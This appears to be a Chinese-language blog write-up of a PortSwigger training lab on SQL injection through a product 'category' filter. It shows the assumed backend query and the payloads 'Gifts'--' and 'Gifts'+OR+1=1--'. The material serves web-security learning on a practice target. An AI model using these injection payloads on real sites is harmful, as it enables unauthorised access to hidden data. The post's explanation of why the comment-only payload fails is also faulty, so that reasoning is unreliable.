---
title: "SQL injection（Lab1)"
published: 2026-10-13
description: "PortSwigger SQLi 入门：WHERE 子句取隐藏数据 Lab：SQL injection vulnerability …"
category: "靶场"
---

# PortSwigger SQLi 入门：WHERE 子句取隐藏数据

> Lab：[SQL injection vulnerability in WHERE clause allowing retrieval of hidden data](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data)

## 题目在考什么

商品列表按 `category` 过滤，后端大致会拼出类似这样的查询：

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

`released = 1` 表示「只展示已发布商品」。隐藏商品是 `released = 0`，正常点分类看不到。目标就是用 SQL 注入把这些隐藏商品也查出来。

## 注入点

依照题意，从 `category` 入手。例如选择 `category=Clothing%2c+shoes+and+accessories`：

![](https://pic.npiter.de/file/1791901732735_20261013222846423.png)

链接跳转后观察到：

```text
/filter?category=Clothing%2c+shoes+and+accessories
```

参数 `category` 直接拼进 WHERE，是典型的字符串注入点。猜测查询逻辑形如：

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

## 尝试过程

### 第一次：`Gifts'--`

想法：用注释把后面的 `AND released = 1` 砍掉。

拼进去之后，查询大致变成：

```sql
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```

结果：页面能打开，但**并没有出现隐藏商品**。

原因：`--` 只是让「已发布」这个限制失效了，条件还剩 `category = 'Gifts'`。你仍然只能看到 **Gifts 里本来就发布的那些**，`released = 0` 的记录还是不会被选出来。题目要的是「把隐藏数据捞出来」，所以光注释不够。

### 第二次：`Gifts'+OR+1=1--`

拼进去之后大致是：

```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1 -- ...
```

`OR 1=1` 让整段 WHERE 恒真，后面的 `released` 限制也被注释掉，于是所有商品（含隐藏）都会返回，lab 通过：

![](https://pic.npiter.de/file/1791901741900_20261013222846424.png)

## 踩坑

-   以为「注释掉 `released = 1`」就等于「能看到隐藏数据」。其实只是去掉了过滤，**没有主动把隐藏行选出来**；在只有 `category = 'Gifts'` 时，隐藏行本来就不满足条件。
-   要扩大结果集，常用思路是让条件恒真（如 `OR 1=1`），而不是只砍掉后半句。
